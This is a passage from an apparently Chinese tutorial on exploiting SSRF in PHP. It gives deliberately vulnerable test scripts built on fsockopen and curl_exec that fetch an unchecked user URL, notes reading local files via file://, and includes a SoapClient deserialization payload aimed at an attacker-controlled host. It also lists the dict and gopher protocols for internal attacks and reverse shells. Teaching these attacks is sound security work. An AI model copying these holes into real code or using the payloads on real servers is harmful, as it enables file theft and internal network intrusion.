start;">readfile()函数与filegetcontents()函数相似。</p><h3 style="margin-top: 2rem;margin-bottom: 0.5rem;font-weight: 700;color: rgb(248, 95, 72);line-height: 1.35;font-size:20px;line-height:40px;;text-align: start;white-space: normal;font family: Menlo, Monaco, &quot;Source Code Pro&quot;, Consolas, Inconsolata, &quot;Ubuntu Mono&quot;, &quot;DejaVu Sans Mono&quot;, &quot;Courier New&quot;, &quot;Droid Sans Mono&quot;, &quot;Hiragino Sans GB&quot;, 微软雅黑, monospace !important;">fsockopen()</h3><p style="margin-top: 15px;margin-bottom: 15px;font-size:15px;line-height:35px;;white-space: pre-line;line-height: 30px;color: rgb(74, 74, 74);text-align: start;"><code style="background: rgb(243, 241, 241);color: rgb(88, 88, 88);font-size:16px;line-height:36px;;line-height: 18px;font family: consolas, menlo, courier, monospace, &quot;Microsoft Yahei&quot; !important;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span style="background-image: initial;background-position: initial;background-size: initial;background-repeat: initial;background-attachment: initial;background-origin: initial;background-clip: initial;display: inline-block;padding-right: 2px;padding-left: 2px;font-size:14px;line-height:34px;;">fsockopen</span><span style="background-image: initial;background-position: initial;background-size: initial;background-repeat: initial;background-attachment: initial;background-origin: initial;background-clip: initial;display: inline-block;padding-right: 2px;padding-left: 2px;font-size:14px;line-height:34px;;">(</span><span style="background-image: initial;background-position: initial;background-size: initial;background-repeat: initial;background-attachment: initial;background-origin: initial;background-clip: initial;display: inline-block;padding-right: 2px;padding-left: 2px;font-size:14px;line-height:34px;;">$hostname</span><span style="background-image: initial;background-position: initial;background-size: initial;background-repeat: initial;background-attachment: initial;background-origin: initial;background-clip: initial;display: inline-block;padding-right: 2px;padding-left: 2px;font-size:14px;line-height:34px;;">,</span><span style="background-image: initial;background-position: initial;background-size: initial;background-repeat: initial;background-attachment: initial;background-origin: initial;background-clip: initial;display: inline-block;padding-right: 2px;padding-left: 2px;font-size:14px;line-height:34px;;">$port</span><span style="background-image: initial;background-position: initial;background-size: initial;background-repeat: initial;background-attachment: initial;background-origin: initial;background-clip: initial;display: inline-block;padding-right: 2px;padding-left: 2px;font-size:14px;line-height:34px;;">,</span><span style="background-image: initial;background-position: initial;background-size: initial;background-repeat: initial;background-attachment: initial;background-origin: initial;background-clip: initial;display: inline-block;padding-right: 2px;padding-left: 2px;font-size:14px;line-height:34px;;">$errno</span><span style="background-image: initial;background-position: initial;background-size: initial;background-repeat: initial;background-attachment: initial;background-origin: initial;background-clip: initial;display: inline-block;padding-right: 2px;padding-left: 2px;font-size:14px;line-height:34px;;">,</span><span style="background-image: initial;background-position: initial;background-size: initial;background-repeat: initial;background-attachment: initial;background-origin: initial;background-clip: initial;display: inline-block;padding-right: 2px;padding-left: 2px;font-size:14px;line-height:34px;;">$errstr</span><span style="background-image: initial;background-position: initial;background-size: initial;background-repeat: initial;background-attachment: initial;background-origin: initial;background-clip: initial;display: inline-block;padding-right: 2px;padding-left: 2px;font-size:14px;line-height:34px;;">,</span><span style="background-image: initial;background-position: initial;background-size: initial;background-repeat: initial;background-attachment: initial;background-origin: initial;background-clip: initial;display: inline-block;padding-right: 2px;padding-left: 2px;font-size:14px;line-height:34px;;">$timeout</span><span style="background-image: initial;background-position: initial;background-size: initial;background-repeat: initial;background-attachment: initial;background-origin: initial;background-clip: initial;display: inline-block;padding-right: 2px;padding-left: 2px;font-size:14px;line-height:34px;;">)</span></code> 用于打开一个网络连接或者一个Unix 套接字连接，初始化一个套接字连接到指定主机（hostname），实现对用户指定url数据的获取。该函数会使用socket跟服务器建立tcp连接，进行传输原始数据。fsockopen()将返回一个文件句柄，之后可以被其他文件类函数调用（例如：fgets()，fgetss()，fwrite()，fclose()还有feof()）。如果调用失败，将返回false。</p><p style="margin-top: 15px;margin-bottom: 15px;font-size:15px;line-height:35px;;white-space: pre-line;line-height: 30px;color: rgb(74, 74, 74);text-align: start;">测试代码：</p><section class="code-snippet__fix code-snippet__js"><ul class="code-snippet__line-index code-snippet__js"><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li></ul><pre class="code-snippet__js" data-lang="bash"><code><span class="code-snippet_outer">// ssrf.php</span></code><code><span class="code-snippet_outer">&lt;?php</span></code><code><span class="code-snippet_outer"><span class="code-snippet__variable">$host</span>=<span class="code-snippet__variable">$_GET</span>[<span class="code-snippet__string">'url'</span>];</span></code><code><span class="code-snippet_outer"><span class="code-snippet__variable">$fp</span> = fsockopen(<span class="code-snippet__variable">$host</span>, 80, <span class="code-snippet__variable">$errno</span>, <span class="code-snippet__variable">$errstr</span>, 30);</span></code><code><span class="code-snippet_outer"><span class="code-snippet__keyword">if</span> (!<span class="code-snippet__variable">$fp</span>) {</span></code><code><span class="code-snippet_outer">    <span class="code-snippet__built_in">echo</span> <span class="code-snippet__string">"<span class="code-snippet__variable">$errstr</span> (<span class="code-snippet__variable">$errno</span>)&lt;br /&gt;\n"</span>;</span></code><code><span class="code-snippet_outer">} <span class="code-snippet__keyword">else</span> {</span></code><code><span class="code-snippet_outer">    <span class="code-snippet__variable">$out</span> = <span class="code-snippet__string">"GET / HTTP/1.1\r\n"</span>;</span></code><code><span class="code-snippet_outer">    <span class="code-snippet__variable">$out</span> .= <span class="code-snippet__string">"Host: <span class="code-snippet__variable">$host</span>\r\n"</span>;</span></code><code><span class="code-snippet_outer">    <span class="code-snippet__variable">$out</span> .= <span class="code-snippet__string">"Connection: Close\r\n\r\n"</span>;</span></code><code><span class="code-snippet_outer">    fwrite(<span class="code-snippet__variable">$fp</span>, <span class="code-snippet__variable">$out</span>);</span></code><code><span class="code-snippet_outer">    <span class="code-snippet__keyword">while</span> (!feof(<span class="code-snippet__variable">$fp</span>)) {</span></code><code><span class="code-snippet_outer">        <span class="code-snippet__built_in">echo</span> fgets(<span class="code-snippet__variable">$fp</span>, 128);</span></code><code><span class="code-snippet_outer">    }</span></code><code><span class="code-snippet_outer">    fclose(<span class="code-snippet__variable">$fp</span>);</span></code><code><span class="code-snippet_outer">}</span></code><code><span class="code-snippet_outer">?&gt;</span></code></pre></section><p style="margin-top: 15px;margin-bottom: 15px;font-size:15px;line-height:35px;;white-space: pre-line;line-height: 30px;color: rgb(74, 74, 74);text-align: start;">构造 <code style="background: rgb(243, 241, 241);color: rgb(88, 88, 88);font-size:16px;line-height:36px;;line-height: 18px;font family: consolas, menlo, courier, monospace, &quot;Microsoft Yahei&quot; !important;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span style="background-image: initial;background-position: initial;background-size: initial;background-repeat: initial;background-attachment: initial;background-origin: initial;background-clip: initial;display: inline-block;padding-right: 2px;padding-left: 2px;font-size:14px;line-height:34px;;">ssrf</span><span style="background-image: initial;background-position: initial;background-size: initial;background-repeat: initial;background-attachment: initial;background-origin: initial;background-clip: initial;display: inline-block;padding-right: 2px;padding-left: 2px;font-size:14px;line-height:34px;;">.</span><span style="background-image: initial;background-position: initial;background-size: initial;background-repeat: initial;background-attachment: initial;background-origin: initial;background-clip: initial;display: inline-block;padding-right: 2px;padding-left: 2px;font-size:14px;line-height:34px;;">php</span><span style="background-image: initial;background-position: initial;background-size: initial;background-repeat: initial;background-attachment: initial;background-origin: initial;background-clip: initial;display: inline-block;padding-right: 2px;padding-left: 2px;font-size:14px;line-height:34px;;">?</span><span style="background-image: initial;background-position: initial;background-size: initial;background-repeat: initial;background-attachment: initial;background-origin: initial;background-clip: initial;display: inline-block;padding-right: 2px;padding-left: 2px;font-size:14px;line-height:34px;;">url</span><span style="background-image: initial;background-position: initial;background-size: initial;background-repeat: initial;background-attachment: initial;background-origin: initial;background-clip: initial;display: inline-block;padding-right: 2px;padding-left: 2px;font-size:14px;line-height:34px;;">=</span><span style="background-image: initial;background-position: initial;background-size: initial;background-repeat: initial;background-attachment: initial;background-origin: initial;background-clip: initial;display: inline-block;padding-right: 2px;padding-left: 2px;font-size:14px;line-height:34px;;">www</span><span style="background-image: initial;background-position: initial;background-size: initial;background-repeat: initial;background-attachment: initial;background-origin: initial;background-clip: initial;display: inline-block;padding-right: 2px;padding-left: 2px;font-size:14px;line-height:34px;;">.</span><span style="background-image: initial;background-position: initial;background-size: initial;background-repeat: initial;background-attachment: initial;background-origin: initial;background-clip: initial;display: inline-block;padding-right: 2px;padding-left: 2px;font-size:14px;line-height:34px;;">baidu</span><span style="background-image: initial;background-position: initial;background-size: initial;background-repeat: initial;background-attachment: initial;background-origin: initial;background-clip: initial;display: inline-block;padding-right: 2px;padding-left: 2px;font-size:14px;line-height:34px;;">.</span><span style="background-image: initial;background-position: initial;background-size: initial;background-repeat: initial;background-attachment: initial;background-origin: initial;background-clip: initial;display: inline-block;padding-right: 2px;padding-left: 2px;font-size:14px;line-height:34px;;">com</span></code> 即可成功触发ssrf并返回百度主页：</p><p style="margin-top: 15px;margin-bottom: 15px;font-size:15px;line-height:35px;;white-space: pre-line;line-height: 30px;color: rgb(74, 74, 74);text-align: start;"><img data-ratio="0.5135416666666667" src="图片/HACK学习呀_2021-04-01_干货SSRF漏洞利用总结/5_0QQBTRVhqqV5icDtFevOBEnKolXnuw.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou8SgJ1jhUy7l4LlzhmLjv5gPichxPH7gkVric4cuOWanlMUTibia0QQBTRVhqqV5icDtFevOBEnKolXnuw/640?wx_fmt=png'" data-type="png" data-w="1920" style="box-sizing: border-box;border-width: 2px;border-style: solid;border-color: rgb(238, 238, 238);border-radius: 6px;"  /></p><p style="margin-top: 15px;margin-bottom: 15px;font-size:15px;line-height:35px;;white-space: pre-line;line-height: 30px;color: rgb(74, 74, 74);text-align: start;">但是该函数的SSRF无法读取本地文件。</p><h3 style="margin-top: 2rem;margin-bottom: 0.5rem;font-weight: 700;color: rgb(248, 95, 72);line-height: 1.35;font-size:20px;line-height:40px;;text-align: start;white-space: normal;font family: Menlo, Monaco, &quot;Source Code Pro&quot;, Consolas, Inconsolata, &quot;Ubuntu Mono&quot;, &quot;DejaVu Sans Mono&quot;, &quot;Courier New&quot;, &quot;Droid Sans Mono&quot;, &quot;Hiragino Sans GB&quot;, 微软雅黑, monospace !important;">curl_exec()</h3><p style="margin-top: 15px;margin-bottom: 15px;font-size:15px;line-height:35px;;white-space: pre-line;line-height: 30px;color: rgb(74, 74, 74);text-align: start;">curlinit(url)函数初始化一个新的会话，返回一个cURL句柄，供curlsetopt()，curlexec()和curlclose() 函数使用。</p><p style="margin-top: 15px;margin-bottom: 15px;font-size:15px;line-height:35px;;white-space: pre-line;line-height: 30px;color: rgb(74, 74, 74);text-align: start;">测试代码：</p><section class="code-snippet__fix code-snippet__js"><ul class="code-snippet__line-index code-snippet__js"><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li></ul><pre class="code-snippet__js" data-lang="php"><code><span class="code-snippet_outer"><span class="code-snippet__comment">// ssrf.php</span></span></code><code><span class="code-snippet_outer"><span class="code-snippet__meta">&lt;?php</span> </span></code><code><span class="code-snippet_outer"><span class="code-snippet__keyword">if</span> (<span class="code-snippet__keyword">isset</span>($_GET[<span class="code-snippet__string">'url'</span>])){</span></code><code><span class="code-snippet_outer">  $link = $_GET[<span class="code-snippet__string">'url'</span>];</span></code><code><span class="code-snippet_outer">  $curlobj = curl_init(); <span class="code-snippet__comment">// 创建新的 cURL 资源</span></span></code><code><span class="code-snippet_outer">  curl_setopt($curlobj, CURLOPT_POST, <span class="code-snippet__number">0</span>);</span></code><code><span class="code-snippet_outer">  curl_setopt($curlobj,CURLOPT_URL,$link);</span></code><code><span class="code-snippet_outer">  curl_setopt($curlobj, CURLOPT_RETURNTRANSFER, <span class="code-snippet__number">1</span>); <span class="code-snippet__comment">// 设置 URL 和相应的选项</span></span></code><code><span class="code-snippet_outer">  $result=curl_exec($curlobj); <span class="code-snippet__comment">// 抓取 URL 并把它传递给浏览器</span></span></code><code><span class="code-snippet_outer">  curl_close($curlobj); <span class="code-snippet__comment">// 关闭 cURL 资源，并且释放系统资源</span></span></code><code><span class="code-snippet_outer"> </span></code><code><span class="code-snippet_outer">  <span class="code-snippet__comment">// $filename = './curled/'.rand().'.txt';</span></span></code><code><span class="code-snippet_outer">  <span class="code-snippet__comment">// file_put_contents($filename, $result); </span></span></code><code><span class="code-snippet_outer">  <span class="code-snippet__keyword">echo</span> $result;</span></code><code><span class="code-snippet_outer">}</span></code><code><span class="code-snippet_outer"><span class="code-snippet__meta">?&gt;</span></span></code></pre></section><p style="margin-top: 15px;margin-bottom: 15px;font-size:15px;line-height:35px;;white-space: pre-line;line-height: 30px;color: rgb(74, 74, 74);text-align: start;">构造 <code style="background: rgb(243, 241, 241);color: rgb(88, 88, 88);font-size:16px;line-height:36px;;line-height: 18px;font family: consolas, menlo, courier, monospace, &quot;Microsoft Yahei&quot; !important;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span style="background-image: initial;background-position: initial;background-size: initial;background-repeat: initial;background-attachment: initial;background-origin: initial;background-clip: initial;display: inline-block;padding-right: 2px;padding-left: 2px;font-size:14px;line-height:34px;;">ssrf</span><span style="background-image: initial;background-position: initial;background-size: initial;background-repeat: initial;background-attachment: initial;background-origin: initial;background-clip: initial;display: inline-block;padding-right: 2px;padding-left: 2px;font-size:14px;line-height:34px;;">.</span><span style="background-image: initial;background-position: initial;background-size: initial;background-repeat: initial;background-attachment: initial;background-origin: initial;background-clip: initial;display: inline-block;padding-right: 2px;padding-left: 2px;font-size:14px;line-height:34px;;">php</span><span style="background-image: initial;background-position: initial;background-size: initial;background-repeat: initial;background-attachment: initial;background-origin: initial;background-clip: initial;display: inline-block;padding-right: 2px;padding-left: 2px;font-size:14px;line-height:34px;;">?</span><span style="background-image: initial;background-position: initial;background-size: initial;background-repeat: initial;background-attachment: initial;background-origin: initial;background-clip: initial;display: inline-block;padding-right: 2px;padding-left: 2px;font-size:14px;line-height:34px;;">url</span><span style="background-image: initial;background-position: initial;background-size: initial;background-repeat: initial;background-attachment: initial;background-origin: initial;background-clip: initial;display: inline-block;padding-right: 2px;padding-left: 2px;font-size:14px;line-height:34px;;">=</span><span style="background-image: initial;background-position: initial;background-size: initial;background-repeat: initial;background-attachment: initial;background-origin: initial;background-clip: initial;display: inline-block;padding-right: 2px;padding-left: 2px;font-size:14px;line-height:34px;;">www</span><span style="background-image: initial;background-position: initial;background-size: initial;background-repeat: initial;background-attachment: initial;background-origin: initial;background-clip: initial;display: inline-block;padding-right: 2px;padding-left: 2px;font-size:14px;line-height:34px;;">.</span><span style="background-image: initial;background-position: initial;background-size: initial;background-repeat: initial;background-attachment: initial;background-origin: initial;background-clip: initial;display: inline-block;padding-right: 2px;padding-left: 2px;font-size:14px;line-height:34px;;">baidu</span><span style="background-image: initial;background-position: initial;background-size: initial;background-repeat: initial;background-attachment: initial;background-origin: initial;background-clip: initial;display: inline-block;padding-right: 2px;padding-left: 2px;font-size:14px;line-height:34px;;">.</span><span style="background-image: initial;background-position: initial;background-size: initial;background-repeat: initial;background-attachment: initial;background-origin: initial;background-clip: initial;display: inline-block;padding-right: 2px;padding-left: 2px;font-size:14px;line-height:34px;;">com</span></code> 即可成功触发ssrf并返回百度主页：</p><p style="margin-top: 15px;margin-bottom: 15px;font-size:15px;line-height:35px;;white-space: pre-line;line-height: 30px;color: rgb(74, 74, 74);text-align: start;"><img data-ratio="0.514866979655712" src="图片/HACK学习呀_2021-04-01_干货SSRF漏洞利用总结/6_oV2wjsxZoxc7VpV8k9vTCfrnAaiaDA.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou8SgJ1jhUy7l4LlzhmLjv5gicXjFIMpQxf1DtALnlslx4wBEtoV2wjsxZoxc7VpV8k9vTCfrnAaiaDA/640?wx_fmt=png'" data-type="png" data-w="1917" style="box-sizing: border-box;border-width: 2px;border-style: solid;border-color: rgb(238, 238, 238);border-radius: 6px;"  /></p><p style="margin-top: 15px;margin-bottom: 15px;font-size:15px;line-height:35px;;white-space: pre-line;line-height: 30px;color: rgb(74, 74, 74);text-align: start;">也可以使用file协议读取本地文件：</p><p style="margin-top: 15px;margin-bottom: 15px;font-size:15px;line-height:35px;;white-space: pre-line;line-height: 30px;color: rgb(74, 74, 74);text-align: start;"><img data-ratio="0.33902877697841727" src="图片/HACK学习呀_2021-04-01_干货SSRF漏洞利用总结/7_bt10SqVbic1qzxZDhewC1zzzHIvIaw.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou8SgJ1jhUy7l4LlzhmLjv5gH40bYl8o7ftiaQI6K2QVhUe4Dbbt10SqVbic1qzxZDhewC1zzzHIvIaw/640?wx_fmt=png'" data-type="png" data-w="1112" style="box-sizing: border-box;border-width: 2px;border-style: solid;border-color: rgb(238, 238, 238);border-radius: 6px;"  /></p><h3 style="margin-top: 2rem;margin-bottom: 0.5rem;font-weight: 700;color: rgb(248, 95, 72);line-height: 1.35;font-size:20px;line-height:40px;;text-align: start;white-space: normal;font family: Menlo, Monaco, &quot;Source Code Pro&quot;, Consolas, Inconsolata, &quot;Ubuntu Mono&quot;, &quot;DejaVu Sans Mono&quot;, &quot;Courier New&quot;, &quot;Droid Sans Mono&quot;, &quot;Hiragino Sans GB&quot;, 微软雅黑, monospace !important;">SoapClient</h3><p style="margin-top: 15px;margin-bottom: 15px;font-size:15px;line-height:35px;;white-space: pre-line;line-height: 30px;color: rgb(74, 74, 74);text-align: start;">SOAP是简单对象访问协议，简单对象访问协议（SOAP）是一种轻量的、简单的、基于 XML 的协议，它被设计成在 WEB 上交换结构化的和固化的信息。PHP 的 SoapClient 就是可以基于SOAP协议可专门用来访问 WEB 服务的 PHP 客户端。</p><p style="margin-top: 15px;margin-bottom: 15px;font-size:15px;line-height:35px;;white-space: pre-line;line-height: 30px;color: rgb(74, 74, 74);text-align: start;">SoapClient是一个php的内置类，当其进行反序列化时，如果触发了该类中的 <code style="background: rgb(243, 241, 241);color: rgb(88, 88, 88);font-size:16px;line-height:36px;;line-height: 18px;font family: consolas, menlo, courier, monospace, &quot;Microsoft Yahei&quot; !important;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span style="background-image: initial;background-position: initial;background-size: initial;background-repeat: initial;background-attachment: initial;background-origin: initial;background-clip: initial;display: inline-block;padding-right: 2px;padding-left: 2px;font-size:14px;line-height:34px;;">__call</span></code> 方法，那么 <code style="background: rgb(243, 241, 241);color: rgb(88, 88, 88);font-size:16px;line-height:36px;;line-height: 18px;font family: consolas, menlo, courier, monospace, &quot;Microsoft Yahei&quot; !important;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span style="background-image: initial;background-position: initial;background-size: initial;background-repeat: initial;background-attachment: initial;background-origin: initial;background-clip: initial;display: inline-block;padding-right: 2px;padding-left: 2px;font-size:14px;line-height:34px;;">__call</span></code> 便方法可以发送HTTP和HTTPS请求。该类的构造函数如下：</p><section class="code-snippet__fix code-snippet__js"><ul class="code-snippet__line-index code-snippet__js"><li></li></ul><pre class="code-snippet__js" data-lang="php"><code><span class="code-snippet_outer"><span class="code-snippet__keyword">public</span> SoapClient :: SoapClient(mixed $wsdl [，<span class="code-snippet__keyword">array</span> $options ])</span></code></pre></section><ul style="padding-left: 30px;list-style-position: initial;list-style-image: initial;color: rgb(80, 97, 109);font-size:15px;line-height:35px;;text-align: start;white-space: normal;margin-top: 6px !important;list-style-type: square !important;" class="list-paddingleft-2"><li style="margin-top: 6px !important;"><p><span style="color: rgb(74, 74, 74);line-height: 22px;font-size:14px;line-height:34px; !important;">第一个参数是用来指明是否是wsdl模式。</span></p></li><li style="margin-top: 6px !important;"><p><span style="color: rgb(74, 74, 74);line-height: 22px;font-size:14px;line-height:34px; !important;">第二个参数为一个数组，如果在wsdl模式下，此参数可选；如果在非wsdl模式下，则必须设置location和uri选项，其中location是要将请求发送到的SOAP服务器的URL，而 uri 是SOAP服务的目标命名空间。</span></p></li></ul><p style="margin-top: 15px;margin-bottom: 15px;font-size:15px;line-height:35px;;white-space: pre-line;line-height: 30px;color: rgb(74, 74, 74);text-align: start;">知道上述两个参数的含义后，就很容易构造出SSRF的利用Payload了。我们可以设置第一个参数为null，然后第二个参数为一个包含location和uri的数组，location选项的值设置为target_url：</p><section class="code-snippet__fix code-snippet__js"><ul class="code-snippet__line-index code-snippet__js"><li></li><li></li><li></li><li></li><li></li><li></li><li></li></ul><pre class="code-snippet__js" data-lang="xml"><code><span class="code-snippet_outer"><span class="code-snippet__meta">&lt;?php</span></span></code><code><span class="code-snippet_outer">$a = <span class="code-snippet__keyword">new</span> SoapClient(<span class="code-snippet__keyword">null</span>,<span class="code-snippet__keyword">array</span>(<span class="code-snippet__string">'uri'</span>=&gt;<span class="code-snippet__string">'http://47.xxx.xxx.72:2333'</span>, <span class="code-snippet__string">'location'</span>=&gt;<span class="code-snippet__string">'http://47.xxx.xxx.72:2333/aaa'</span>));</span></code><code><span class="code-snippet_outer">$b = serialize($a);</span></code><code><span class="code-snippet_outer"><span class="code-snippet__keyword">echo</span> $b;</span></code><code><span class="code-snippet_outer">$c = unserialize($b);</span></code><code><span class="code-snippet_outer">$c-&gt;a();    <span class="code-snippet__comment">// 随便调用对象中不存在的方法, 触发__call方法进行ssrf</span></span></code><code><span class="code-snippet_outer"><span class="code-snippet__meta">?&gt;</span></span></code></pre></section><p style="margin-top: 15px;margin-bottom: 15px;font-size:15px;line-height:35px;;white-space: pre-line;line-height: 30px;color: rgb(74, 74, 74);text-align: start;">47.xxx.xxx.72监听2333端口，访问ssrf.php，即可在47.xxx.xxx.72上得到访问的数据：<br  /></p><p style="margin-top: 15px;margin-bottom: 15px;font-size:15px;line-height:35px;;white-space: pre-line;line-height: 30px;color: rgb(74, 74, 74);text-align: start;"><img data-ratio="0.22395833333333334" src="图片/HACK学习呀_2021-04-01_干货SSRF漏洞利用总结/8_1G9UO1C8k4OA2UicjghJhOJRGMZ5Ow.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou8SgJ1jhUy7l4LlzhmLjv5gaUnHZI9lxnico4zqDzPzx8clE51G9UO1C8k4OA2UicjghJhOJRGMZ5Ow/640?wx_fmt=png'" data-type="png" data-w="1728" style="box-sizing: border-box;border-width: 2px;border-style: solid;border-color: rgb(238, 238, 238);border-radius: 6px;"  /></p><p style="margin-top: 15px;margin-bottom: 15px;font-size:15px;line-height:35px;;white-space: pre-line;line-height: 30px;color: rgb(74, 74, 74);text-align: start;">如上图所示，ssrf触发成功。</p><p style="margin-top: 15px;margin-bottom: 15px;font-size:15px;line-height:35px;;white-space: pre-line;line-height: 30px;color: rgb(74, 74, 74);text-align: start;">由于它仅限于http/https协议，所以用处不是很大。但是如果这里的http头部还存在crlf漏洞，那么我们就可以进行ssrf+crlf，注入或修改一些http请求头，详情请看：《SoapClient+crlf组合拳进行SSRF》</p><h3 style="margin-top: 2rem;margin-bottom: 0.5rem;font-weight: 700;color: rgb(248, 95, 72);line-height: 1.35;font-size:20px;line-height:40px;;text-align: start;white-space: normal;font family: Menlo, Monaco, &quot;Source Code Pro&quot;, Consolas, Inconsolata, &quot;Ubuntu Mono&quot;, &quot;DejaVu Sans Mono&quot;, &quot;Courier New&quot;, &quot;Droid Sans Mono&quot;, &quot;Hiragino Sans GB&quot;, 微软雅黑, monospace !important;">SSRF漏洞利用的相关协议</h3><p style="margin-top: 15px;margin-bottom: 15px;font-size:15px;line-height:35px;;white-space: pre-line;line-height: 30px;color: rgb(74, 74, 74);text-align: start;">SSRF漏洞的利用所涉及的协议有：</p><ul style="padding-left: 30px;list-style-position: initial;list-style-image: initial;color: rgb(80, 97, 109);font-size:15px;line-height:35px;;text-align: start;white-space: normal;margin-top: 6px !important;list-style-type: square !important;" class="list-paddingleft-2"><li style="margin-top: 6px !important;"><p><span style="color: rgb(74, 74, 74);line-height: 22px;font-size:14px;line-height:34px; !important;">file协议：在有回显的情况下，利用 file 协议可以读取任意文件的内容</span></p></li><li style="margin-top: 6px !important;"><p><span style="color: rgb(74, 74, 74);line-height: 22px;font-size:14px;line-height:34px; !important;">dict协议：泄露安装软件版本信息，查看端口，操作内网redis服务等</span></p></li><li style="margin-top: 6px !important;"><p><span style="color: rgb(74, 74, 74);line-height: 22px;font-size:14px;line-height:34px; !important;">gopher协议：gopher支持发出GET、POST请求。可以先截获get请求包和post请求包，再构造成符合gopher协议的请求。gopher协议是ssrf利用中一个最强大的协议(俗称万能协议)。可用于反弹shell</span></p></li><li style="margin-top: 6px !important;"><p><span style="color: rgb(74, 74, 74);line-height: 22px;font-size:14px;line-height:34px; !important;">http/s协议：探测内网主机存活</span></p></li></ul><p style="margin-top: 15px;margin-bottom: 15px;font-size:15px;line-height:35px;;white-space: pre-line;line-height: 30px;color: rgb(74, 74, 74);text-align: start;">下面我们对这些协议的利用进行逐一演示。</p><h2 style="margin-top: 2rem;margin-bottom: 0.5rem;font-weight: 700;color: rgb(248, 95, 72);line-height: 1.35;font-size:24px;line-height:44px;;text-align: start;white-space: normal;font family: Menlo, Monaco, &quot;Source Code Pro&quot;, Consolas, Inconsolata, &quot;Ubuntu Mono&quot;, &quot;DejaVu Sans Mono&quot;, &quot;Courier New&quot;, &quot;Droid Sans Mono&quot;, &quot;Hiragino Sans GB&quot;, 微软雅黑, monospace !important;">常见利用方式（file、http/s和dict协议）</h2><p style="margin-top: 15px;margin-bottom: 15px;font-size:15px;line-height:35px;;white-space: pre-line;line-height: 30px;color: rgb(74, 74, 74);text-align: start;">SSRF的利用主要就是读取内网文件、探测内网主机存活、扫描内网端口、攻击内网其他应用等，而这些利用的手法无一不与这些协议息息相关。</p><p style="margin-top: 15px;margin-bottom: 15px;font-size:15px;line-height:35px;;white-space: pre-line;line-height: 30px;color: rgb(74, 74, 74);text-align: start;">以下几个演示所用的测试代码：</p><section class="code-snippet__fix code-snippet__js"><ul class="code-snippet__line-index code-snippet__js"><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li></ul><pre class="code-snippet__js" data-lang="php"><code><span class="code-snippet_outer"><span class="code-snippet__comment">// ssrf.php</span></span></code><code><span class="code-snippet_outer"><span class="code-snippet__meta">&lt;?php</span> </span></code><code><span class="code-snippet_outer"><span class="code-snippet__keyword">if</span> (<span class="code-snippet__keyword">isset</span>($_GET[<span class="code-snippet__string">'url'</span>])){</span></code><code><span class="code-snippet_outer">  $link = $_GET[<span class="code-snippet__string">'url'</span>];</span></code><code><span class="code-snippet_outer">  $curlobj = curl_init(); <span class="code-snippet__comment">// 创建新的 cURL 资源</span></span></code><code><span class="code-snippet_outer">  curl_setopt($curlobj, CURLOPT_POST, <span class="code-snippet__number">0</span>);</span></code><code><span class="code-snippet_outer">  curl_setopt($curlobj,CURLOPT_URL,$link);</span></code><code><span class="code-snippet_outer">  curl_setopt($curlobj, CURLOPT_RETURNTRANSFER, <span class="code-snippet__number">1</span>); <span class="code-snippet__comment">// 设置 URL 和相应的选项</span></span></code><code><span class="code-snippet_outer">  $result=curl_exec($curlobj); <span class="code-snippet__comment">// 抓取 URL 并把它传递给浏览器</span></span></code><code><span class="code-snippet_outer">  curl_close($curlobj); <span class="code-snippet__comment">// 关闭 cURL 资源，并且释放系统资源</span></span></code><code><span class="code-snippet_outer"> </span></code><code><span class="code-snippet_outer">  <span class="code-snippet__comment">// $filename = './curled/'.rand().'.txt';</span></span></code><code><span class="code-snippet_outer">  <span class="code-snippet__comment">// file_put_contents($filename, $result); </span></span></code><code><span class="code-snippet_outer">  <span class="code-snippet__keyword">echo</span> $result;</span></code><code><span class="code-snippet_outer">}</span></code><code><span class="code-snippet_outer"><span class="code-snippet__meta">?&gt;</span></span></code></pre></section><h3 style="margin-top: 2rem;margin-bottom: 0.5rem;font-weight: 700;color: rgb(248, 95, 72);line-height: 1.35;font-size:20px;line-height:40px;;text-align: start;white-space: normal;font family: Menlo, Monaco, &quot;Source Code Pro&quot;, Consolas, Inconsolata, &quot;Ubuntu Mono&quot;, &quot;DejaVu Sans Mono&quot;, &quot;Courier New&quot;, &quot;Droid Sans Mono&quot;, &quot;Hiragino Sans GB&quot;, 微软雅黑, monospace !important;">读取内网文件（file协议）</h3><p style="margin-top: 15px;margin-bottom: 15px;font-size:15px;line-height:35px;;white-space: pre-line;line-height: 30px;color: rgb(74, 74, 74);text-align: start;">我们构造如下payload，即可将服务器上的本地文件及网站源码读取出来：</p><pre style="padding-top: 8px;padding-bottom: 6px;background: rgb(45, 45, 45);border-radius: 0px;overflow-y: auto;color: rgb(80, 97, 109);text-align: start;font-size:10px;line-height:30px;;line-height: 12px;font family: consolas, menlo, courier, monospace, &quot;Microsoft Yahei&quot; !important;border-width: 1px !important;border-style: solid !important;border-color: rgb(226, 226, 226) !important;"><ol class="list-paddingleft-2" style="padding-top: 10px;padding-bottom: 10px;padding-left: 30px;list-style-position: initial;list-style-image: initial;color: transparent;overflow-y: auto;list-style-type: none !important;"><li style="padding-left: 1em;list-style-type: decimal;margin-top: 6px !important;"><p><span style="color: rgb(74, 74, 74);display: block;line-height: 22px;font-size:14px;line-height:34px; !important;word-break: inherit !important;"><span style="line-height: 22px;display: block;word-break: inherit !important;"><code style="white-space: pre-wrap;margin-left: -20px;display: flex;overflow: initial;line-height: 12px;overflow-wrap: normal;border-width: 0px;border-style: initial;border-color: initial;font-size:10px;line-height:30px;;font family: inherit !important;"><span style="color: rgb(204, 204, 204);line-height: 20px;font-size:13px;line-height:33px; !important;white-space: inherit !important;">ssrf</span><span style="color: rgb(204, 204, 204);line-height: 20px;font-size:13px;line-height:33px; !important;white-space: inherit !important;">.</span><span style="color: rgb(204, 204, 